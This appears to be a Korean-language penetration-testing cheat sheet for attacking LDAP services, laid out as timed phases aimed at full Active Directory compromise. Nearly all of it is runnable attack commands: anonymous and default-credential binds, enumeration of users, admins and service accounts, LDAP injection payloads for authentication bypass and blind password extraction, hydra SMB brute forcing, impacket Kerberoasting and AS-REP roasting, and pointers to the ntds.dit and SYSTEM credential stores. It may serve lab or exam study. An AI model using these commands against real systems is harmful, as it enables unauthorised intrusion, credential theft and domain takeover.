# 🏢 LDAP ATTACKS (Port 389)

> **목표: LDAP 서비스 발견 후 20-25분 내에 도메인 정보 완전 수집 및 AD 공격 준비**

## ⚡ 즉시 실행할 명령어들

### 🚀 LDAP 발견 즉시 실행

```bash
# 1. LDAP 포트 확인
nmap -p 389,636,3268,3269 {IP}
nmap -sV -p 389 {IP}

# 2. 익명 바인딩 시도
ldapsearch -x -h {IP} -s base

# 3. 기본 DN(Distinguished Name) 확인
ldapsearch -x -h {IP} -s base namingcontexts

# 4. LDAP NSE 스크립트 실행 (백그라운드)
nmap --script ldap-* -p 389 {IP} &

# 5. enum4linux LDAP 정보 수집
enum4linux -l {IP}
```

### ⚡ 도메인 정보 즉시 확인

```bash
# 도메인 컨트롤러 정보
ldapsearch -x -h {IP} -s base "(objectclass=*)" defaultNamingContext

# 스키마 정보
ldapsearch -x -h {IP} -s base "(objectclass=*)" schemaNamingContext

# 루트 DSE 정보
ldapsearch -x -h {IP} -s base "(objectclass=*)" "*" +
```

---

## 📋 단계별 체크리스트

### 🎯 Phase 1: 발견 및 기본 정보 수집 (5분)

- [ ] **LDAP 포트 확인** `nmap -p 389,636 {IP}`
- [ ] **LDAPS(SSL) 지원 확인** (포트 636)
- [ ] **익명 바인딩 가능성 확인** `ldapsearch -x`
- [ ] **기본 DN 확인** `namingcontexts`
- [ ] **도메인 환경 식별** (Active Directory 여부)

### 🔍 Phase 2: 도메인 정보 열거 (10분)

- [ ] **도메인 사용자 열거** `(objectClass=user)`
- [ ] **도메인 그룹 열거** `(objectClass=group)`
- [ ] **컴퓨터 계정 열거** `(objectClass=computer)`
- [ ] **관리자 그룹 확인** `Domain Admins, Enterprise Admins`
- [ ] **SPN 계정 확인** `servicePrincipalName=*`

### 💥 Phase 3: 인증 기반 공격 (7분)

- [ ] **LDAP injection 테스트**
- [ ] **기본 자격증명 시도**
- [ ] **브루트포스 공격** (필요시)
- [ ] **크레덴셜 확보시 추가 정보 수집**
- [ ] **패스워드 정책 확인**

### 🎯 Phase 4: AD 공격 준비 (3분)

- [ ] **Kerberoasting 대상 식별**
- [ ] **ASREPRoasting 대상 확인**
- [ ] **다른 AD 서비스 연계 준비**
- [ ] **수집된 정보 분석 및 정리**

---

## 🎯 상황별 대응

### 🔓 익명 바인딩 성공시

```bash
# 기본 도메인 정보 수집
ldapsearch -x -h {IP} -s base "(objectclass=*)" defaultNamingContext
ldapsearch -x -h {IP} -s base "(objectclass=*)" rootDomainNamingContext

# 도메인 DN 확인 후 사용자 열거
DC_STRING="DC=company,DC=com"  # 실제 결과로 교체
ldapsearch -x -h {IP} -b "$DC_STRING" "(objectClass=user)" sAMAccountName

# 그룹 정보 열거
ldapsearch -x -h {IP} -b "$DC_STRING" "(objectClass=group)" cn member

# 컴퓨터 계정 열거
ldapsearch -x -h {IP} -b "$DC_STRING" "(objectClass=computer)" name operatingSystem

# 모든 객체 간단 열거
ldapsearch -x -h {IP} -b "$DC_STRING" "(objectClass=*)" dn | grep "^dn:"
```

### 👥 사용자 정보 상세 수집

```bash
# 모든 사용자 계정과 속성
ldapsearch -x -h {IP} -b "$DC_STRING" "(objectClass=user)" sAMAccountName cn mail description userPrincipalName

# 활성화된 사용자만
ldapsearch -x -h {IP} -b "$DC_STRING" "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName

# 관리자 권한 사용자 확인
ldapsearch -x -h {IP} -b "$DC_STRING" "(memberOf=CN=Domain Admins,CN=Users,$DC_STRING)" sAMAccountName

# 서비스 계정 (SPN 있는 계정)
ldapsearch -x -h {IP} -b "$DC_STRING" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# 패스워드 만료 안된 계정
ldapsearch -x -h {IP} -b "$DC_STRING" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" sAMAccountName

# 패스워드 변경 불가 계정
ldapsearch -x -h {IP} -b "$DC_STRING" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))" sAMAccountName
```

### 🏢 그룹 정보 상세 수집

```bash
# 모든 그룹 나열
ldapsearch -x -h {IP} -b "$DC_STRING" "(objectClass=group)" cn description member

# 관리자 그룹들
ldapsearch -x -h {IP} -b "$DC_STRING" "(cn=Domain Admins)" member
ldapsearch -x -h {IP} -b "$DC_STRING" "(cn=Enterprise Admins)" member
ldapsearch -x -h {IP} -b "$DC_STRING" "(cn=Administrators)" member

# 특권 그룹들
ldapsearch -x -h {IP} -b "$DC_STRING" "(cn=Schema Admins)" member
ldapsearch -x -h {IP} -b "$DC_STRING" "(cn=Account Operators)" member
ldapsearch -x -h {IP} -b "$DC_STRING" "(cn=Backup Operators)" member

# 그룹 멤버십 확인 (특정 사용자)
ldapsearch -x -h {IP} -b "$DC_STRING" "(sAMAccountName={USERNAME})" memberOf
```

### 💻 컴퓨터 및 인프라 정보

```bash
# 도메인 컨트롤러 확인
ldapsearch -x -h {IP} -b "$DC_STRING" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" name

# 서버 컴퓨터
ldapsearch -x -h {IP} -b "$DC_STRING" "(&(objectClass=computer)(operatingSystem=*Server*))" name operatingSystem

# 워크스테이션
ldapsearch -x -h {IP} -b "$DC_STRING" "(&(objectClass=computer)(!(operatingSystem=*Server*)))" name operatingSystem

# 최근 로그온한 컴퓨터
ldapsearch -x -h {IP} -b "$DC_STRING" "(objectClass=computer)" name lastLogon

# DNS 정보
ldapsearch -x -h {IP} -b "$DC_STRING" "(objectClass=dnsNode)" name
```

### 🔐 크레덴셜 확보시 고급 열거

```bash
# 인증된 연결로 더 많은 정보 수집
ldapsearch -x -h {IP} -D "{DOMAIN}\\{USERNAME}" -w {PASSWORD} -b "$DC_STRING" "(objectClass=user)" *

# 패스워드 정책 확인
ldapsearch -x -h {IP} -D "{USERNAME}@{DOMAIN}" -w {PASSWORD} -b "$DC_STRING" "(objectClass=domainDNS)" maxPwdAge minPwdAge minPwdLength pwdHistoryLength

# GPO (Group Policy Object) 정보
ldapsearch -x -h {IP} -D "{USERNAME}@{DOMAIN}" -w {PASSWORD} -b "CN=Policies,CN=System,$DC_STRING" "(objectClass=groupPolicyContainer)"

# 신뢰 관계 확인
ldapsearch -x -h {IP} -D "{USERNAME}@{DOMAIN}" -w {PASSWORD} -b "CN=System,$DC_STRING" "(objectClass=trustedDomain)"

# 세밀한 패스워드 정책
ldapsearch -x -h {IP} -D "{USERNAME}@{DOMAIN}" -w {PASSWORD} -b "CN=Password Settings Container,CN=System,$DC_STRING" "(objectClass=msDS-PasswordSettings)"
```

### 🎭 LDAP Injection 테스트

```bash
# 기본 LDAP injection 페이로드
# 웹 애플리케이션에서 LDAP 인증을 사용하는 경우

# 인증 우회 페이로드
*)(uid=*))(|(uid=*
*)(|(password=*)
*))%00

# 속성 추출 페이로드
admin)(&(password=*)(cn=*
admin)(&(password=secret)(description=*

# Boolean-based 블라인드 인젝션
admin)(&(password=a*)(cn=admin
admin)(&(password=b*)(cn=admin

# 에러 기반 인젝션
admin)(&(password=secret)(invalidattribute=*
```

---

## 🚨 문제 해결

### 🚫 LDAP 연결 거부시

```bash
# LDAPS (SSL) 시도
ldapsearch -x -H ldaps://{IP}:636 -s base

# 다른 LDAP 포트 확인
nmap -p 389,636,3268,3269 {IP}

# StartTLS 시도
ldapsearch -x -h {IP} -Z -s base

# 간단한 연결 테스트
telnet {IP} 389
nc -nv {IP} 389
```

### 🔒 익명 바인딩 실패시

```bash
# 기본 자격증명 시도
ldapsearch -x -h {IP} -D "cn=admin,dc=company,dc=com" -w admin
ldapsearch -x -h {IP} -D "administrator@company.com" -w password

# 다른 인증 방법 시도
ldapsearch -x -h {IP} -D "company\\administrator" -w password

# null 바인딩 시도
ldapsearch -h {IP} -x -D "" -w ""

# Guest 계정 시도
ldapsearch -x -h {IP} -D "guest" -w ""
ldapsearch -x -h {IP} -D "cn=guest,cn=users,dc=company,dc=com" -w guest
```

### 🔍 DN(Distinguished Name) 확인 실패시

```bash
# 다양한 방법으로 DN 추정
# 일반적인 DN 패턴들
DC_PATTERNS=("dc=local" "dc=domain,dc=local" "dc=company,dc=com" "dc=test,dc=local")

for pattern in "${DC_PATTERNS[@]}"; do
    echo "Testing DN: $pattern"
    ldapsearch -x -h {IP} -b "$pattern" -s base "(objectclass=*)" 2>/dev/null
done

# nmap을 통한 도메인 정보 수집
nmap --script ldap-rootdse -p 389 {IP}

# DNS를 통한 도메인 추정
nslookup {IP}
dig -x {IP}
```

### 📊 검색 결과가 제한적일 때

```bash
# 검색 크기 제한 조정
ldapsearch -x -h {IP} -b "$DC_STRING" -z 1000 "(objectClass=user)"

# 시간 제한 조정
ldapsearch -x -h {IP} -b "$DC_STRING" -l 60 "(objectClass=user)"

# 페이징을 통한 큰 결과 처리
ldapsearch -x -h {IP} -b "$DC_STRING" -E pr=100/noprompt "(objectClass=user)"

# 더 구체적인 검색 필터
ldapsearch -x -h {IP} -b "$DC_STRING" "(&(objectClass=user)(cn=a*))" cn
```

### 🐌 LDAP 응답이 느릴 때

```bash
# 타임아웃 조정
ldapsearch -x -h {IP} -o ldif-wrap=no -o nettimeout=10 -b "$DC_STRING"

# 필요한 속성만 요청
ldapsearch -x -h {IP} -b "$DC_STRING" "(objectClass=user)" sAMAccountName

# 병렬 검색
#!/bin/bash
ldapsearch -x -h {IP} -b "$DC_STRING" "(objectClass=user)" sAMAccountName &
ldapsearch -x -h {IP} -b "$DC_STRING" "(objectClass=group)" cn &
ldapsearch -x -h {IP} -b "$DC_STRING" "(objectClass=computer)" name &
wait
```

---

## 🔗 다른 서비스와 연계

### 🗂️ SMB와 연계 (445 포트)

```bash
# LDAP에서 수집한 사용자로 SMB 접근
ldapsearch -x -h {IP} -b "$DC_STRING" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d: -f2 | tr -d ' ' > ldap_users.txt

# SMB 브루트포스
hydra -L ldap_users.txt -P passwords.txt smb://{IP}

# 각 사용자별 SMB 공유 확인
while read user; do
    echo "Testing SMB for user: $user"
    smbmap -H {IP} -u $user -p password
done < ldap_users.txt
```

### 🔐 Kerberos와 연계 (88 포트)

```bash
# LDAP에서 SPN 계정 확인 (Kerberoasting 대상)
ldapsearch -x -h {IP} -b "$DC_STRING" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# ASREPRoasting 대상 확인 (사전 인증 불필요 계정)
ldapsearch -x -h {IP} -b "$DC_STRING" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# impacket으로 Kerberoasting
impacket-GetUserSPNs {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {IP}

# impacket으로 ASREPRoasting
impacket-GetNPUsers {DOMAIN}/ -usersfile ldap_users.txt -dc-ip {IP}
```

### 🖥️ RDP와 연계 (3389 포트)

```bash
# LDAP 사용자로 RDP 접근 시도
rdesktop {IP} -u {LDAP_USER} -p password
xfreerdp /u:{LDAP_USER} /p:{PASSWORD} /v:{IP}

# 관리자 그룹 멤버로 RDP 시도
ldapsearch -x -h {IP} -b "$DC_STRING" "(memberOf=CN=Domain Admins,CN=Users,$DC_STRING)" sAMAccountName | grep sAMAccountName | cut -d: -f2 > admin_users.txt
```

### 🌐 웹 서비스와 연계

```bash
# LDAP 인증을 사용하는 웹 애플리케이션 공격
# 수집한 사용자 계정으로 웹 로그인 시도
curl -X POST -d "username={LDAP_USER}&password=password" http://{IP}/login

# AD 인증 웹 애플리케이션
curl -X POST -d "username={DOMAIN}\\{LDAP_USER}&password=password" http://{IP}/login
```

---

## 🛠️ 고급 LDAP 공격 기법

### 📋 ldapdomaindump 활용

```bash
# ldapdomaindump 설치
pip3 install ldapdomaindump

# 익명 접근으로 도메인 정보 덤프
ldapdomaindump -n {IP}

# 인증된 접근으로 상세 정보 덤프
ldapdomaindump -u '{DOMAIN}\\{USERNAME}' -p {PASSWORD} {IP}

# 출력 형식 지정
ldapdomaindump -u '{DOMAIN}\\{USERNAME}' -p {PASSWORD} {IP} -o /tmp/ldapdump/
```

### 🔍 LDAP 정보 자동 수집 스크립트

```bash
#!/bin/bash
IP=$1
DOMAIN=$2

echo "=== LDAP Information Gathering for $IP ==="

# 기본 정보 수집
echo "[+] Basic LDAP Information:"
ldapsearch -x -h $IP -s base namingcontexts 2>/dev/null

# 도메인 정보
echo "[+] Domain Information:"
ldapsearch -x -h $IP -s base defaultNamingContext 2>/dev/null

# 사용자 수집
echo "[+] Domain Users:"
ldapsearch -x -h $IP -b "DC=${DOMAIN//./, DC=}" "(objectClass=user)" sAMAccountName 2>/dev/null | grep sAMAccountName

# 그룹 수집
echo "[+] Domain Groups:"
ldapsearch -x -h $IP -b "DC=${DOMAIN//./, DC=}" "(objectClass=group)" cn 2>/dev/null | grep "^cn:"

# 관리자 확인
echo "[+] Domain Admins:"
ldapsearch -x -h $IP -b "DC=${DOMAIN//./, DC=}" "(memberOf=CN=Domain Admins,CN=Users,DC=${DOMAIN//./, DC=})" sAMAccountName 2>/dev/null

echo "=== LDAP Scan Complete ==="
```

### 🔧 LDAP 설정 파일 확인 (시스템 접근시)

```bash
# LDAP 서버 설정 파일들
cat /etc/ldap/ldap.conf
cat /etc/openldap/ldap.conf
cat /usr/local/etc/openldap/ldap.conf

# slapd 설정 (OpenLDAP)
cat /etc/ldap/slapd.conf
cat /etc/openldap/slapd.conf

# Active Directory 관련 파일들 (Windows)
# C:\Windows\NTDS\ntds.dit
# C:\Windows\System32\config\SYSTEM
```

---

## ⏱️ 시간 관리 가이드

### 🎯 5분 안에 완료할 것들

- [ ] LDAP 포트 확인 및 연결 테스트
- [ ] 익명 바인딩 시도
- [ ] 기본 DN 확인
- [ ] 도메인 환경 식별

### 🔍 20분 안에 완료할 것들

- [ ] 모든 사용자/그룹/컴퓨터 열거
- [ ] 관리자 그룹 멤버 확인
- [ ] SPN 계정 식별 (Kerberoasting 대상)
- [ ] 패스워드 정책 확인

### 💥 25분 후 판단 기준

**성공 기준:**

- [ ] 도메인 사용자 목록 완전 수집
- [ ] 관리자 권한 계정 식별
- [ ] Kerberoasting/ASREPRoasting 대상 확인
- [ ] 다른 AD 서비스 공격 준비 완료

**중간 성공시 계속 진행:**

- [ ] 수집한 사용자로 다른 서비스 브루트포스
- [ ] Kerberos 공격 시도
- [ ] 웹 애플리케이션 LDAP injection 테스트

**실패시 다음 단계:**

- [ ] 기본 자격증명 브루트포스를 백그라운드로 실행
- [ ] SMB/RPC 등 다른 AD 서비스로 우선순위 이동
- [ ] 수집한 최소한의 정보라도 다른 공격에 활용

**다음 단계**:

- AD 환경 확인시 Kerberos 공격 또는 다른 AD 서비스 공격
- 사용자 정보 수집시 SMB/RDP/SSH 브루트포스
- 웹 서비스 발견시 LDAP injection 테스트
- 실패시 다른 `PORT-ATTACKS/` 파일로 이동
